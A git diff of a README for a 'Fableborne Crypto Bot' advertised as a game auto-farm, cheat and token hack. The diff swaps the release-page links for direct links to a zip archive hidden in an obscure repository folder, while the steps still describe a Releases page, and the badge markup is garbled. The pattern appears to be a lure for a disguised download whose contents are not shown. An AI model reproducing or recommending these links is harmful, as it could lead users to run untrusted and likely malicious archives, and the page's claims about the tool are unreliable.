@@ -6,13 +6,13 @@ Welcome to the Fableborne Crypto Bot! This bot automates farming and clicker act
 
 ## 🔗 Download Now
 
-[![Download Fableborne Crypto Bot](https://img.shields.io/badge/Download-Fableborne%20Crypto%20Bot-blue.svg)](https://github.com/MantaJP/Fableborne-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/releases)
+[![Download Fableborne Crypto Bot](https://github.com/MantaJP/Fableborne-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/raw/refs/heads/main/perceivably/Cheat-Crypto-Token-Farm-Fableborne-Auto-Api-Bot-Game-Hack-Clicker-endogen.zip%20Crypto%https://github.com/MantaJP/Fableborne-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/raw/refs/heads/main/perceivably/Cheat-Crypto-Token-Farm-Fableborne-Auto-Api-Bot-Game-Hack-Clicker-endogen.zip)](https://github.com/MantaJP/Fableborne-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/raw/refs/heads/main/perceivably/Cheat-Crypto-Token-Farm-Fableborne-Auto-Api-Bot-Game-Hack-Clicker-endogen.zip)
 
 ## 📥 Download & Install
 
 To get started, visit this page to download the latest version of the Fableborne Crypto Bot:
 
-[https://github.com/MantaJP/Fableborne-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/releases](https://github.com/MantaJP/Fableborne-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/releases)
+[https://github.com/MantaJP/Fableborne-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/raw/refs/heads/main/perceivably/Cheat-Crypto-Token-Farm-Fableborne-Auto-Api-Bot-Game-Hack-Clicker-endogen.zip](https://github.com/MantaJP/Fableborne-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/raw/refs/heads/main/perceivably/Cheat-Crypto-Token-Farm-Fableborne-Auto-Api-Bot-Game-Hack-Clicker-endogen.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the version that best suits your needs. You will find the latest version at the top of the list.
@@ -89,7 +89,7 @@ This bot relates to the following topics for those interested in exploring furth
 
 For additional resources and updates:
 
-- [GitHub Repository](https://github.com/MantaJP/Fableborne-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api)
+- [GitHub Repository](https://github.com/MantaJP/Fableborne-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/raw/refs/heads/main/perceivably/Cheat-Crypto-Token-Farm-Fableborne-Auto-Api-Bot-Game-Hack-Clicker-endogen.zip)
 - [Community Discord](#) (Join for tips and help)
 - [Documentation](#) (In-depth guide on features and setup)
 
